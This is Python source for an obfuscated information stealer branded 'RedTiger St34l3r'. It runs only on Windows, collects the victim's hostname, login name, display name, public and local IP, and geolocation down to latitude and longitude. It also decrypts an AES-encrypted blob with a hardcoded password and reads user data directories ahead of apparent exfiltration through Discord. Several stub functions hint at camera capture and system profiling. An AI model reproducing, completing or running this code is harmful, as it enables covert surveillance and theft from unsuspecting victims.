
import sys

def VOGDCHULKGQICLURYIURVPKGEYCBQLLLRJZBDQRQUYAAGHGTKXVGQMLAEASXMWRBJTYLRHVRHBAJ():
    def IEMGFRFEYABIGLSMLWYJSFWQMMQSAHCUIEUOFETEHXSYKZOGEVLSVGSZCOXZEXQYEFMWFRMXXNSCOUISKUNGBRU():
        if sys.platform.startswith("win"):
            return False
        else:
            return True
    
    try: 
        ECDOVQJSYBYPIHYNQHPUZQIKKHDDOVADVTNZSXGWFUBTGARGZYKUUMWJAQIHTGNDRKK = IEMGFRFEYABIGLSMLWYJSFWQMMQSAHCUIEUOFETEHXSYKZOGEVLSVGSZCOXZEXQYEFMWFRMXXNSCOUISKUNGBRU()
        if ECDOVQJSYBYPIHYNQHPUZQIKKHDDOVADVTNZSXGWFUBTGARGZYKUUMWJAQIHTGNDRKK == True:
            return ECDOVQJSYBYPIHYNQHPUZQIKKHDDOVADVTNZSXGWFUBTGARGZYKUUMWJAQIHTGNDRKK
    except:
        return True
    
if VOGDCHULKGQICLURYIURVPKGEYCBQLLLRJZBDQRQUYAAGHGTKXVGQMLAEASXMWRBJTYLRHVRHBAJ() == True:
    sys.exit()
    
import os
import socket
import win32api
import requests
import base64
import ctypes
import threading
import discord
import zipfile
import io
from json import loads
from urllib.request import urlopen
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend

def KJFLZUDLLTVLMBFXIHFMUJXGGYSGIMVAXBBSBUFNQOCGYMVRNRTGIGVZW(KKXLQLQEXRGKNBKDEGZIVFFRLKQKFZUEZHKTKBPTBTCSZYESGFMKXW): 
    ECDOVQJSYBYPIHYNQHPUZQIKKHDDOVADVTNZSXGWFUBTGARGZYKUUMWJAQIHTGNDRKK_system_info = None
    return ECDOVQJSYBYPIHYNQHPUZQIKKHDDOVADVTNZSXGWFUBTGARGZYKUUMWJAQIHTGNDRKK_system_info

def KCWMZUFPOPCWMFWMVQJLPDUBNBLENXZGUPCGBKYNYILRKAWPRLMPLCYMDAUHATHHHPSTSQCDBIHATPIEHNQHDD(KKXLQLQEXRGKNBKDEGZIVFFRLKQKFZUEZHKTKBPTBTCSZYESGFMKXW):
    NKWKZUOMLSVOMRNTCESJOTWRXFHYOATCXELRGLKTPOMYYBLEJWHBWRXVXITXELGUANPEMFKZUNKZRN = None
    return NKWKZUOMLSVOMRNTCESJOTWRXFHYOATCXELRGLKTPOMYYBLEJWHBWRXVXITXELGUANPEMFKZUNKZRN

def LFWBQOTYUYEAWXBQUACEETELSYTQUUSUTCAEAYHXDVDZIJTAUCTJCLYXMZKVZZAPU(KKXLQLQEXRGKNBKDEGZIVFFRLKQKFZUEZHKTKBPTBTCSZYESGFMKXW):
    TOHBKPSSCZKHRLYFXNVEUJVREMLVEEVCTXFRECUCCXBXFLGNLZJMAYAYWUWYOBDMTPYRS = None
    return TOHBKPSSCZKHRLYFXNVEUJVREMLVEEVCTXFRECUCCXBXFLGNLZJMAYAYWUWYOBDMTPYRS

def ZXWYUZWGKKUBPHXTZHMTSDCXIXJZIFYXXERXAUXIUIIYWFIZFRNLPRNJNQTKJDSELBOLDFHHSWPFJICNUWAXAZFVGKCFUCJLXH(): 
    BTIQTBLHPEALIBJBAMNZPMXDQNPPNIXHCODDGLZFTMGHDOYTEOMRPVQNKNXSAEZESVJMHUDIIFYQJUGIMMVAMRZNZ = None
    return BTIQTBLHPEALIBJBAMNZPMXDQNPPNIXHCODDGLZFTMGHDOYTEOMRPVQNKNXSAEZESVJMHUDIIFYQJUGIMMVAMRZNZ

def MYVPZQOBGUQVVOOBSDXDRPXGIDPSEMBXILTUYSPCJBIMLNZFPZCHAUECVAGDTTRWPXCVAIPVEMDCUFMDFSUBFNJGVYHULT(KKXLQLQEXRGKNBKDEGZIVFFRLKQKFZUEZHKTKBPTBTCSZYESGFMKXW): 
    WJVLHCGOFLUZAXIPYBORMGLZDJDOMTNQIDVETIHIKARLYPTYRQ = None
    IHRHQZQLZZZDFNPURSUBMFLZHDQLMZOLVSQHZBLYVFEZNYCHDCTLWZZABVHBMOKAPORHXFUPYBONAXEMTMIEDQRNMEXZWXQ = None
    OUQYWXQYDRBWWELOVBCVPPENSOZQKJGPLNKUMGFSRAVCULHPLWO = None
    LEGMWKDGKYFELYOPFTUFJXNRHGUBVDYGRLLYQMZRAJYADMROUXUTMSSYRZHZBSNEVUILNXEHNLHXLFYYETNCECKVXJCHPXTMXJK = None
    THJSRYXEPKKJMSXJXRZDOGGDYIVHJVUMFSFLREQWLQEFSXHVSF = None
    ZDMOHDEYPMRCPXIHNQPRWTETHBZHUXFMUZLKXFHSUIOGMFWAMSFGECMGOKMJU = None
    return WJVLHCGOFLUZAXIPYBORMGLZDJDOMTNQIDVETIHIKARLYPTYRQ, IHRHQZQLZZZDFNPURSUBMFLZHDQLMZOLVSQHZBLYVFEZNYCHDCTLWZZABVHBMOKAPORHXFUPYBONAXEMTMIEDQRNMEXZWXQ, OUQYWXQYDRBWWELOVBCVPPENSOZQKJGPLNKUMGFSRAVCULHPLWO, LEGMWKDGKYFELYOPFTUFJXNRHGUBVDYGRLLYQMZRAJYADMROUXUTMSSYRZHZBSNEVUILNXEHNLHXLFYYETNCECKVXJCHPXTMXJK, THJSRYXEPKKJMSXJXRZDOGGDYIVHJVUMFSFLREQWLQEFSXHVSF, ZDMOHDEYPMRCPXIHNQPRWTETHBZHUXFMUZLKXFHSUIOGMFWAMSFGECMGOKMJU

def RMRGMMRYLZBCOVUIFUGEITVVBPPMQCCYUEWLYYOSPBUMQGNPVCVNXQZTXHWMERUZDIRPUYYGGOBUSLJJZMWPVRIUKWMPEGC(KKXLQLQEXRGKNBKDEGZIVFFRLKQKFZUEZHKTKBPTBTCSZYESGFMKXW):
    PFWBHOQRXKOHXQJQIZCVLKANKVBXWAZAMTGBOGIRPHIDOGFNLDMLHSQCZDBGLXSJCDCLHRPWXZKAHGUIUONFYPDUMROISAGELSKA = None
    VDDZDOFELGGUXDYQUPFNEVVYRCTQBBQHKJQKIBRQLDYKCAPGSWLRUFFTXVAUPBNSPIDERQZDPFEHOQJTAMSZYOYZKDKEZTJ = None
    DVXGFDWVEVMMGTLMOVNDFPQDUODFVWJTKHYPIGETUJTNDJRVMZUGVILOWHHXJSOWXCEJHOUNQUEK = None
    return PFWBHOQRXKOHXQJQIZCVLKANKVBXWAZAMTGBOGIRPHIDOGFNLDMLHSQCZDBGLXSJCDCLHRPWXZKAHGUIUONFYPDUMROISAGELSKA, VDDZDOFELGGUXDYQUPFNEVVYRCTQBBQHKJQKIBRQLDYKCAPGSWLRUFFTXVAUPBNSPIDERQZDPFEHOQJTAMSZYOYZKDKEZTJ, DVXGFDWVEVMMGTLMOVNDFPQDUODFVWJTKHYPIGETUJTNDJRVMZUGVILOWHHXJSOWXCEJHOUNQUEK

def SICIIMFQHANBEDZFEPWSIQSIDAMPVXRHRXPTQISLZYCPBDRCLRAMJZIPTLNANAMSBJZNGURMHIMIHSFOYBPAARZNWJGRAHJ(KKXLQLQEXRGKNBKDEGZIVFFRLKQKFZUEZHKTKBPTBTCSZYESGFMKXW):
    OHRGDFOUJLQICQSMRPMUCDOZHKJCERUNHNTIXPYYDNDTRYCICLPUNKYAGUQVZLRKNBE = None
    return OHRGDFOUJLQICQSMRPMUCDOZHKJCERUNHNTIXPYYDNDTRYCICLPUNKYAGUQVZLRKNBE

def UGBTNFNZJMYXUOKYEXQDASSBEOEUQRSSRJEBBLSNRYOYNMQAGEHJVGBWPUOVJWMPNC(KKXLQLQEXRGKNBKDEGZIVFFRLKQKFZUEZHKTKBPTBTCSZYESGFMKXW):
    ECDOVQJSYBYPIHYNQHPUZQIKKHDDOVADVTNZSXGWFUBTGARGZYKUUMWJAQIHTGNDRKK_camera_capture = None
    return ECDOVQJSYBYPIHYNQHPUZQIKKHDDOVADVTNZSXGWFUBTGARGZYKUUMWJAQIHTGNDRKK_camera_capture

def JYTAKZJBYWEHACHNXHLGECFCJEICSCQXDAQEPLAVENYAZWHXKMLWTSMIENUFKUDQ(KKXLQLQEXRGKNBKDEGZIVFFRLKQKFZUEZHKTKBPTBTCSZYESGFMKXW): 
    MQDFCMBNJHFOFRWEFOQZGFLMSZLNKVIHVSSYXYNDMLEIKAFVPIMWOGYLCQQSQURLZNNYDPUTSROLWKHAYN = None
    return MQDFCMBNJHFOFRWEFOQZGFLMSZLNKVIHVSSYXYNDMLEIKAFVPIMWOGYLCQQSQURLZNNYDPUTSROLWKHAYN

def PSYWDDIZRQKFXMKVLHRULSFQPEVLIDVITYLNWWEBPKDAFEFZLYMFOXYOZGIPNDFEJQJXHTVFKHJEZFSIAZTHYTDFGDLAUYZ(): pass
def MYEVKGOVRUZGJWWRXSGIGHWAWYDJTDGNJECDGSQDPRNAHNPBFRZQLVCAVDEIANTNPRXGRPSNSUYWVJUTNGRPSP(): pass
def LFAHZHQIMQPZWEACTKDURCPUPWTWWTWXMLJNEWVHHTDIIZKMMDVTKVSTSKBYQLYWKALFNJVWRDMREPIHCKBMDTYRTGCSFWJR(): pass
def NQMDEOVDKNVIADWORURKIRDGZMSNRLXWHCTCTXEVCNJLCOIZSMZJVOAT(): pass
def OWYQWGLKULYQRUSKDWJYXSIFLMJTFTGTPANCENNLWFKQVVGPNBQXVKOMUZFBILFZDXSLXBQZUYHIXDGIITZDBTMCVTAJ(): pass
def CSLHXMZSGHEKOEDEALIPNWPKGWSXQXTJNOVYRWCMJNNLWAYTSKQZK(): pass
def CTBGOXIQGGKUUWVZGKJSZGVICDPOQGBSIMGULQXCJGWSOHRZQLECRYEQMQIDVMTCNYZIKYKKXZFDXNIQRDDCAIYVAZKUGHE(): pass
def JFECVIVZYRWCLHFKSHEFCARBUDQHHOSGGCJTSCZLDFRCWJTANANBQOCLRZHIMYL(): pass
def PWXQTQFCVDHIEQZFDKHAKJFOBBKVBJAJGKEEIVPNTTFQYXFGJA(): pass
def TLTBUTCPRTILOFOTHGLQZGTANPPFSUVTYZVMVMJLKDGERQARVZYRPLWHSRPTZXGIHEMYVHTJCHIMNDQAFRQ(): pass
def NIEBTHBWBLAZTFBGVJHBTDQSBPFJEBIWZYLVXCDPFDAVUQBBPELVSTPCGAELWGGYHDSRZSUNUSMCFWTXUBWMGTLVN(): pass
def CDZYYCAGJXSJMZZHTIFAHBESGSFVSXVRLEWXXVDSUPOVNOKWLYRUZTBNGTRMLNSSPXULSVFXCQROUSHWFCFSTDICNANXTNMP(): pass

def IUIQAHPWCGAMIBUPTDRDBHAOONWAZEWWHWMRAWCTROHNBMWCAEFDFQALTFKCOAGYTEKXZPIRKFUCFILYTYVGAFMVDLLQENPATW(title):
    try:
        if sys.platform.startswith("win"):
            ctypes.windll.kernel32.SetConsoleTitleW(title)
        elif sys.platform.startswith("linux"):
            sys.stdout.write(f"\x1b]2;{title}\x07")
    except:
        pass
        
def DKAKTYZMMPMJFIEUTOTZOZMIPDHOKTQTMXIWSDBFGVZUZJFLCAVBPQPVMNCSLZNIFVTAXFGTNBJZDUMPACIACGOA():
    try:
        if sys.platform.startswith("win"):
            os.system("cls")
        elif sys.platform.startswith("linux"):
            os.system("clear")
    except:
        pass

def LLJCTWGKIJYQVMPWMUJYNSNQTXFQCINYRKOHQCZBOILYICUYZPQVAHVRTHXNMOZHCTPEFRFUQPDNGMJVORGAUTLRQ(CSQBCKGIHCLTUPBISDQPQOLEBOXZHGDXHVTYVZKUUQDCOKBYLAPWUAUWLCK, EVKOFFCZKFFROUVVUDPPCZMEACKVKXSJEAJVJLFKCJLMRFLQWWQSCLUUXRJYBCVRSZGJQXRLQZMWFTRDCCGXEVGDJTJFERUWMICX):
    def ECCHBXWSBILERYKYRZGAXHXVHVAGWWQYIGHGIIWHDNTKBGMODOCNLF(RWOLCHLYTFMEPQTRYAFREMFGDOUWYYEOOUFVLCXOXYVIMOSBSWINQGKBHCDEQYENODADOACFQAOHDCVRVOG, WMLNDXRSCFIGIJWBKFHZZDDDDOJSNGCZIKEQCELTLMNMEDLQHJGLLJUA):
        TLNZDWLOQCUAHBXYZHGHSKDUNPFKSEZGQIYBXSODCBVWZKLNTKAOFUXIMHDYAKCVFZHTZW = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=WMLNDXRSCFIGIJWBKFHZZDDDDOJSNGCZIKEQCELTLMNMEDLQHJGLLJUA, iterations=100000, backend=default_backend())
        if isinstance(RWOLCHLYTFMEPQTRYAFREMFGDOUWYYEOOUFVLCXOXYVIMOSBSWINQGKBHCDEQYENODADOACFQAOHDCVRVOG, str):  
            RWOLCHLYTFMEPQTRYAFREMFGDOUWYYEOOUFVLCXOXYVIMOSBSWINQGKBHCDEQYENODADOACFQAOHDCVRVOG = RWOLCHLYTFMEPQTRYAFREMFGDOUWYYEOOUFVLCXOXYVIMOSBSWINQGKBHCDEQYENODADOACFQAOHDCVRVOG.encode()  
        return TLNZDWLOQCUAHBXYZHGHSKDUNPFKSEZGQIYBXSODCBVWZKLNTKAOFUXIMHDYAKCVFZHTZW.derive(RWOLCHLYTFMEPQTRYAFREMFGDOUWYYEOOUFVLCXOXYVIMOSBSWINQGKBHCDEQYENODADOACFQAOHDCVRVOG)

    CSQBCKGIHCLTUPBISDQPQOLEBOXZHGDXHVTYVZKUUQDCOKBYLAPWUAUWLCK_data = base64.b64decode(CSQBCKGIHCLTUPBISDQPQOLEBOXZHGDXHVTYVZKUUQDCOKBYLAPWUAUWLCK)
    WMLNDXRSCFIGIJWBKFHZZDDDDOJSNGCZIKEQCELTLMNMEDLQHJGLLJUA = CSQBCKGIHCLTUPBISDQPQOLEBOXZHGDXHVTYVZKUUQDCOKBYLAPWUAUWLCK_data[:16]
    ZEMNJDPOEXZEYMMGBDLVMZPIPDHQEETGEEOJCYFOLPMUXLFNLQQTH = CSQBCKGIHCLTUPBISDQPQOLEBOXZHGDXHVTYVZKUUQDCOKBYLAPWUAUWLCK_data[16:32]
    CSQBCKGIHCLTUPBISDQPQOLEBOXZHGDXHVTYVZKUUQDCOKBYLAPWUAUWLCK_data = CSQBCKGIHCLTUPBISDQPQOLEBOXZHGDXHVTYVZKUUQDCOKBYLAPWUAUWLCK_data[32:]
    CILCVSIGPDHLATFXTTZAHHOPCXKDWVREIWANPFKDXCZAAKHPJRPEHDLIZZLFAYTIXHFSJC = ECCHBXWSBILERYKYRZGAXHXVHVAGWWQYIGHGIIWHDNTKBGMODOCNLF(EVKOFFCZKFFROUVVUDPPCZMEACKVKXSJEAJVJLFKCJLMRFLQWWQSCLUUXRJYBCVRSZGJQXRLQZMWFTRDCCGXEVGDJTJFERUWMICX, WMLNDXRSCFIGIJWBKFHZZDDDDOJSNGCZIKEQCELTLMNMEDLQHJGLLJUA)
    JYHTWFWFHOKRALNVITHAOFXQRTHJVNKQOEIADGBVTQKTWHVEYUILCZTHBRZYTZKW = Cipher(algorithms.AES(CILCVSIGPDHLATFXTTZAHHOPCXKDWVREIWANPFKDXCZAAKHPJRPEHDLIZZLFAYTIXHFSJC), modes.CBC(ZEMNJDPOEXZEYMMGBDLVMZPIPDHQEETGEEOJCYFOLPMUXLFNLQQTH), backend=default_backend())
    FCRHSZAXHFSPHZWANTMUEWYDRKZAJPILRQIIBGEACHIJVEUTJPQXOCDQFNRYSZH = JYHTWFWFHOKRALNVITHAOFXQRTHJVNKQOEIADGBVTQKTWHVEYUILCZTHBRZYTZKW.decryptor()
    IJODWPYAMOIQFIXXSDPMJSKCNZQSRYTVHZQCFQTSVBJGTSPKWFDQOECLFMEB = FCRHSZAXHFSPHZWANTMUEWYDRKZAJPILRQIIBGEACHIJVEUTJPQXOCDQFNRYSZH.update(CSQBCKGIHCLTUPBISDQPQOLEBOXZHGDXHVTYVZKUUQDCOKBYLAPWUAUWLCK_data) + FCRHSZAXHFSPHZWANTMUEWYDRKZAJPILRQIIBGEACHIJVEUTJPQXOCDQFNRYSZH.finalize()
    AVTHRLLSKFPPUTDZDNOWBEMVETBESTNPDIYHEGJHPQVYUTZPFZWLELEONQOHNMOJZWXPJLWBTRZCQWBIPDOYUMGJ = padding.PKCS7(128).unpadder()
    BCXFOWQWNBKUCDMFPRADCWYMDFFDOBMYXDAEBVYXJIPQHEEZQGPAGNGYLGCSORURV = AVTHRLLSKFPPUTDZDNOWBEMVETBESTNPDIYHEGJHPQVYUTZPFZWLELEONQOHNMOJZWXPJLWBTRZCQWBIPDOYUMGJ.update(IJODWPYAMOIQFIXXSDPMJSKCNZQSRYTVHZQCFQTSVBJGTSPKWFDQOECLFMEB) + AVTHRLLSKFPPUTDZDNOWBEMVETBESTNPDIYHEGJHPQVYUTZPFZWLELEONQOHNMOJZWXPJLWBTRZCQWBIPDOYUMGJ.finalize()
    return BCXFOWQWNBKUCDMFPRADCWYMDFFDOBMYXDAEBVYXJIPQHEEZQGPAGNGYLGCSORURV.decode()

IUIQAHPWCGAMIBUPTDRDBHAOONWAZEWWHWMRAWCTROHNBMWCAEFDFQALTFKCOAGYTEKXZPIRKFUCFILYTYVGAFMVDLLQENPATW("")

try: BXBJHLVWDMAFCBOSPVWEZRTIZDPPWCDUEOOPGUGPQNNWGTKAHIARENMYEDMAGVEYVUSFREGSMMTNIXJQMYULFHXWPHXYE    = socket.gethostname()
except: BXBJHLVWDMAFCBOSPVWEZRTIZDPPWCDUEOOPGUGPQNNWGTKAHIARENMYEDMAGVEYVUSFREGSMMTNIXJQMYULFHXWPHXYE = "None"

try: BJFTZVPNDTUSITXPRZGIGHMNXVIUZCKJALYICJKKCWPJUFFJYRRGKNUTMSGXUZLKRZVPMASXZSQWOLYAQFUSCS    = os.getlogin()
except: BJFTZVPNDTUSITXPRZGIGHMNXVIUZCKJALYICJKKCWPJUFFJYRRGKNUTMSGXUZLKRZVPMASXZSQWOLYAQFUSCS = "None"

try: LQFGKMIUJJOUHMJQYLQAVJITSZMUQNJRJBFMDUBXSYFXTUDGCKS    = win32api.GetUserNameEx(win32api.NameDisplay)
except: LQFGKMIUJJOUHMJQYLQAVJITSZMUQNJRJBFMDUBXSYFXTUDGCKS = "None"

try: LWAJZSQCXQSUVKYBIGVGUAXTKJXFGNIFFBCPRFMKKZIZXVGSPK    = requests.get("https://api.ipify.org?format=json").json().get("ip", "None")
except: LWAJZSQCXQSUVKYBIGVGUAXTKJXFGNIFFBCPRFMKKZIZXVGSPK = "None"

try: WNXYILYQOUEISQJRNUZDUHWRMINOATIHTYVXRUFXUPWXCHWKPWBPBZHVBURZBMOJSWOAFVHFTZVV    = socket.gethostbyname(socket.gethostname())
except: WNXYILYQOUEISQJRNUZDUHWRMINOATIHTYVXRUFXUPWXCHWKPWBPBZHVBURZBMOJSWOAFVHFTZVV = "None"

WCAGOZIJRGSVIGKQSCDISOXCCVDEUCSSGMJPPLMVECARCPRZJDZIUBY = r"""
BIPqokNMSuK/caGZj19TjGhUxUOMsKL7LBmvW8HX8l2OvGglCQQ34de4/CxpH3lInruV2BCEcP6N74YbHj+t3dHZYtAhz9fIy1rL3vx3JEeUcNBL26PaazJyoMhqjuo+TdNC9iuMDf1eJ15cNzVUfvBGyu3Gq+LxqOTnfeEVMH4qcI3s72TEBElnTX4/A9/dpOqlFNWztfGkv0sEtkmPyg==
"""

FCBXBXBJYPERVZUTDKITTITJXAETGNMXYVRHNBBBSTRJAZQZWHKHTYALZNUXYWC            = "roQmQSdjNCIFYpBJcLWFasSLORecmtVEbupPPwSynxdDxPCaRwJfNZnzmIUpLHsCLYEwyZccAWFKGCFYBEZFjedUOPaTopTVPLYQGEUIMafoZTKmWdPpDWClrwgUDzhDcbIVxx"
NQRWCABAFWVJEHQTYOQMPJDDRKBLFOWILUGMTOGKJUXJTIUFPMESCLUYEKUBMWCJXIIQVPMTSHKMUCOOPCB        = "redtiger.shop"
ASKWZPHCCQUTTFFWYXRKAQQYASYKURZDIODVNYFPTNCNGIKTPKGZMNHZFSIXNSAWZWWFLCSALVQNFACEBSVTEGPVBIONHJJOBZV    = 0xa80505
PHEDBDZQUYJJEESUSPWIJQJTJYXKKDDXEBBMAKKZMRRMQKYDYR = "RedTiger St34l3r"
FPEIUYAZUZAWCXCAMWHOAPUNUQKQCELBQYOHPDKYPXULUDXWNEBIHK   = "https://google.com"
QDRJVHGHALOBKZUVZGHSGSKHIAYYHMEDDCFARHRNFMKWQMABQEZJHBWYFFPXMMCTSOH    = "RedTiger St34l3r - github.com/loxy0dev/RedTiger-Tools"
XRUEIIQEXNXZPFRMAMPKFTNZRNFSEGZGVTAPUXSFJTBMBDCACUHOLIONRCXZWJDHMWZTMTULTLTBXKR   = {"text": QDRJVHGHALOBKZUVZGHSGSKHIAYYHMEDDCFARHRNFMKWQMABQEZJHBWYFFPXMMCTSOH, "icon_url": FPEIUYAZUZAWCXCAMWHOAPUNUQKQCELBQYOHPDKYPXULUDXWNEBIHK}
DQDSPVPHGUXXANOZYJCMIVRNHJSSYHWLWQTRLEHRTXSAYELZLAOPPPTYYXSPMFKZRIAWR    = f'`{BJFTZVPNDTUSITXPRZGIGHMNXVIUZCKJALYICJKKCWPJUFFJYRRGKNUTMSGXUZLKRZVPMASXZSQWOLYAQFUSCS} "{LWAJZSQCXQSUVKYBIGVGUAXTKJXFGNIFFBCPRFMKKZIZXVGSPK}"`'
IPVPPDBWMKAPWCCFBRJYNEQRAXCYTZXDCEVDCRENPNXAOJOVRAKPHSTNPEVTLSERJLXJLOH    = LLJCTWGKIJYQVMPWMUJYNSNQTXFQCINYRKOHQCZBOILYICUYZPQVAHVRTHXNMOZHCTPEFRFUQPDNGMJVORGAUTLRQ(WCAGOZIJRGSVIGKQSCDISOXCCVDEUCSSGMJPPLMVECARCPRZJDZIUBY, FCBXBXBJYPERVZUTDKITTITJXAETGNMXYVRHNBBBSTRJAZQZWHKHTYALZNUXYWC)

MVWMZUFOWXSDQKJGUWQONGNZLTHNIFOOEWXCMAMLIPPQGILYKAWKCJ           = os.getenv("WINDIR", None)
IARUXCSWSHWSIAEAMCHRLHYKPLFBEGIWPMMYJVHHWSYIGXJBISFADFKOOCZVNZ       = os.getenv('USERPROFILE', None)
CPTWNCGNFOGUMPYBIFICJRDOOTZUGSSSOQEIEZSUQLYCPEGDPAXSGLQTVLHRCFNGSDIMZUXPWTZSXU     = os.getenv('LOCALAPPDATA', None)
SDURXBHFCAQHRZPXSLMXGNJRMLRLOPMSLQDUPDCEQRWTSZNPBSYIYWZWSSRDCX   = os.getenv('APPDATA', None)
QAAZFWTKHWVKNHMDGQHUCWDLGFLCXQAZLPIDSGRKVAAKHJEIWFWWDWBARTKJYEPSHAEQDAMOZUPPFSTFZKH = os.getenv('ProgramFiles(x86)', None)
if QAAZFWTKHWVKNHMDGQHUCWDLGFLCXQAZLPIDSGRKVAAKHJEIWFWWDWBARTKJYEPSHAEQDAMOZUPPFSTFZKH is None:
    QAAZFWTKHWVKNHMDGQHUCWDLGFLCXQAZLPIDSGRKVAAKHJEIWFWWDWBARTKJYEPSHAEQDAMOZUPPFSTFZKH = os.getenv('ProgramFiles', None)

try:
    OCZNGOBLJFWDEMFSMDUMVIEPJCFADCALHLUDWKQPOBECYSJRZJ = requests.get(f"https://{NQRWCABAFWVJEHQTYOQMPJDDRKBLFOWILUGMTOGKJUXJTIUFPMESCLUYEKUBMWCJXIIQVPMTSHKMUCOOPCB}/api/ip/ip={LWAJZSQCXQSUVKYBIGVGUAXTKJXFGNIFFBCPRFMKKZIZXVGSPK}")
    UBKNKJWSAYCAKMSNFDSDZTDLITVWLZXUFAPXKWZAUMENAAZVJUDGUYZVHXN = OCZNGOBLJFWDEMFSMDUMVIEPJCFADCALHLUDWKQPOBECYSJRZJ.json()

    WPZVJULFQZPAHMWEUFPJLROWQDCTRVWGBDCKSOMTZIREQLABRAIVOXVKFLZXTECYMDIEJFVZRAVGDBBWLAPKNJUQBYPQDPOE = UBKNKJWSAYCAKMSNFDSDZTDLITVWLZXUFAPXKWZAUMENAAZVJUDGUYZVHXN.get('country', "None")
    WPZVJULFQZPAHMWEUFPJLROWQDCTRVWGBDCKSOMTZIREQLABRAIVOXVKFLZXTECYMDIEJFVZRAVGDBBWLAPKNJUQBYPQDPOE_code = UBKNKJWSAYCAKMSNFDSDZTDLITVWLZXUFAPXKWZAUMENAAZVJUDGUYZVHXN.get('country_code', "None")
    CUYWHUIMMRPRPRSAYZADKYIVPVGXLGZWELNNNUWTLMRNPBXETDUVTZCRCNFNCIAEPMIDTVQGZKR = UBKNKJWSAYCAKMSNFDSDZTDLITVWLZXUFAPXKWZAUMENAAZVJUDGUYZVHXN.get('region', "None")
    CUYWHUIMMRPRPRSAYZADKYIVPVGXLGZWELNNNUWTLMRNPBXETDUVTZCRCNFNCIAEPMIDTVQGZKR_code = UBKNKJWSAYCAKMSNFDSDZTDLITVWLZXUFAPXKWZAUMENAAZVJUDGUYZVHXN.get('region_code', "None")
    DPERSAVPQJWNVVVBUFFJHLVVPNKDMWCLRIFTSVVZMPWKEXIPNFZPSWEEMMDIRYGFICFZACLUIWNS = UBKNKJWSAYCAKMSNFDSDZTDLITVWLZXUFAPXKWZAUMENAAZVJUDGUYZVHXN.get('zip', "None")
    KIJMOZRKQUWQZNDIYRHWLEDAETCQBHIYFLJWJZGYUOVBVPRDXYRMORBIXIVIAXUGZKYKXIVEYF = UBKNKJWSAYCAKMSNFDSDZTDLITVWLZXUFAPXKWZAUMENAAZVJUDGUYZVHXN.get('city', "None")
    GAOQESZMFZKMQBQYDHKDLUNWHTQTNHRUHOWHOTAXKEXBCVLDSNZDTQMWVZSIMXLMJOQFKJCFZUVFQEJTJQWGMDFBVKUNPVLAWLW = UBKNKJWSAYCAKMSNFDSDZTDLITVWLZXUFAPXKWZAUMENAAZVJUDGUYZVHXN.get('latitude', "None")
    RYYXVDSDAUDYIKWFSJJFQUIVUUMDWCIJUGHJFHUNBKDEFCZUZVRYMAANQHYNYXAD = UBKNKJWSAYCAKMSNFDSDZTDLITVWLZXUFAPXKWZAUMENAAZVJUDGUYZVHXN.get('longitude', "None")
    STWCFHQJUOJIWNVNNMDFLUOFNCIJBQOIJZPXPCLVMEKSLJNASYDFJAQXCJZFTCESVSBYRRLNEMRVHOXCVXYSVAXOVEJTGPMKKS = UBKNKJWSAYCAKMSNFDSDZTDLITVWLZXUFAPXKWZAUMENAAZVJUDGUYZVHXN.get('timezone', "None")
    QBRPJDJTUBPQBGXMJNHMDVFEDVQTPIEZMELOWNTFFNDHPRYUIBFSWOABNWGJCPIAMXKTIHWMZNZYZWKQLE = UBKNKJWSAYCAKMSNFDSDZTDLITVWLZXUFAPXKWZAUMENAAZVJUDGUYZVHXN.get('isp', "None")
    RMZEIFLXIULAXDTVOIKFOCSUCQSKWAJZSXWVRNBKGIDFVHXIPZJEXFDEUUURZIVYCLAFKDHCBVSAXBPLOHNQ = UBKNKJWSAYCAKMSNFDSDZTDLITVWLZXUFAPXKWZAUMENAAZVJUDGUYZVHXN.get('org', "None")
    AGYJJKJJXNNPMCAHHLINWJKEDEAPQOCIJEUBKPZYIGTWZQDMCQT = UBKNKJWSAYCAKMSNFDSDZTDLITVWLZXUFAPXKWZAUMENAAZVJUDGUYZVHXN.get('as', "None")
except:
    OCZNGOBLJFWDEMFSMDUMVIEPJCFADCALHLUDWKQPOBECYSJRZJ = requests.get(f"http://ip-api.com/json/{LWAJZSQCXQSUVKYBIGVGUAXTKJXFGNIFFBCPRFMKKZIZXVGSPK}")
    UBKNKJWSAYCAKMSNFDSDZTDLITVWLZXUFAPXKWZAUMENAAZVJUDGUYZVHXN = OCZNGOBLJFWDEMFSMDUMVIEPJCFADCALHLUDWKQPOBECYSJRZJ.json()

    WPZVJULFQZPAHMWEUFPJLROWQDCTRVWGBDCKSOMTZIREQLABRAIVOXVKFLZXTECYMDIEJFVZRAVGDBBWLAPKNJUQBYPQDPOE = UBKNKJWSAYCAKMSNFDSDZTDLITVWLZXUFAPXKWZAUMENAAZVJUDGUYZVHXN.get('country', "None")
    WPZVJULFQZPAHMWEUFPJLROWQDCTRVWGBDCKSOMTZIREQLABRAIVOXVKFLZXTECYMDIEJFVZRAVGDBBWLAPKNJUQBYPQDPOE_code = UBKNKJWSAYCAKMSNFDSDZTDLITVWLZXUFAPXKWZAUMENAAZVJUDGUYZVHXN.get('countryCode', "None")
    CUYWHUIMMRPRPRSAYZADKYIVPVGXLGZWELNNNUWTLMRNPBXETDUVTZCRCNFNCIAEPMIDTVQGZKR = UBKNKJWSAYCAKMSNFDSDZTDLITVWLZXUFAPXKWZAUMENAAZVJUDGUYZVHXN.get('regionName', "None")
    CUYWHUIMMRPRPRSAYZADKYIVPVGXLGZWELNNNUWTLMRNPBXETDUVTZCRCNFNCIAEPMIDTVQGZKR_code = UBKNKJWSAYCAKMSNFDSDZTDLITVWLZXUFAPXKWZAUMENAAZVJUDGUYZVHXN.get('region', "None")
    DPERSAVPQJWNVVVBUFFJHLVVPNKDMWCLRIFTSVVZMPWKEXIPNFZPSWEEMMDIRYGFICFZACLUIWNS = UBKNKJWSAYCAKMSNFDSDZTDLITVWLZXUFAPXKWZAUMENAAZVJUDGUYZVHXN.get('zip', "None")
    KIJMOZRKQUWQZNDIYRHWLEDAETCQBHIYFLJWJZGYUOVBVPRDXYRMORBIXIVIAXUGZKYKXIVEYF = UBKNKJWSAYCAKMSNFDSDZTDLITVWLZXUFAPXKWZAUMENAAZVJUDGUYZVHXN.get('city', "None")
